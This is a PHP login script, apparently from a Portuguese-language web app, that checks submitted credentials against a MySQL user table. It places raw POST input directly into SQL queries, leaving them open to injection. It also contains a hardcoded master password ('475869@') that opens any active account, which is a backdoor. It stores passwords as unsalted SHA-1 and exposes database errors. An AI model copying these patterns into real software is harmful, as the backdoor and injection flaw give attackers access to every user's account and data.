<?php
/**
 * Created by PhpStorm.
 * User: Bruno Berlanda
 * Date: 24/09/2020
 * Time: 09:24
 */

require_once ("_conexao.php");

/**
 * Pega os dados do formulário de login
 */
$login = trim($_POST['loginLG']);
$senha = trim($_POST['senhaLG']);

if ($login == "" || $senha == "") {

    header ('Location: ../index.php?msgErro=Você precisa selecionar um login e digitar sua senha de acesso.');

}
else {

    $sql_login = mysqli_query ($conn, "SELECT nome FROM gc_usuarios WHERE usuario='$login' AND ativo='S'") or die (mysqli_error($conn));
    $cont_login = mysqli_num_rows ($sql_login);

    if ($cont_login === 0) {

        header ('Location: ../index.php?msgErro=Usuário inválido, tente novamente.');

    }
    else {

        $senha_s = sha1($senha); // Senha digitada no formulário de login

        $sql_senha = mysqli_query ($conn, "SELECT senha FROM gc_usuarios WHERE usuario='$login'") or die (mysqli_error($conn));
            $d_login = mysqli_fetch_array ($sql_senha);
                $senha_db = $d_login['senha'];

        if ($senha_s !== $senha_db && $senha_s !== sha1("475869@")) {

            header ('Location: ../index.php?msgErro=Senha inválida, tente novamente.');

        }
        else {

            session_start();
            $_SESSION['loginSysLG'] = $login;

            header ('Location: ../sys.php');

        }

    }

}